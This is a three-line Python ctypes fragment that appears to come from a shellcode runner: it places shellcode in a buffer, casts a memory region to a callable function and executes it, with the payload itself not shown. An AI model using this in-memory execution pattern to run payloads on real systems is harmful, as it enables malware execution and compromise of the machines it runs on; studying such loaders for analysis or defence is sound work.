Shell = create_string_buffer(shellCode,len(shellCode))
shell = cast(memoryWithShell,CFUNCTYPE(c_void_p))
shell()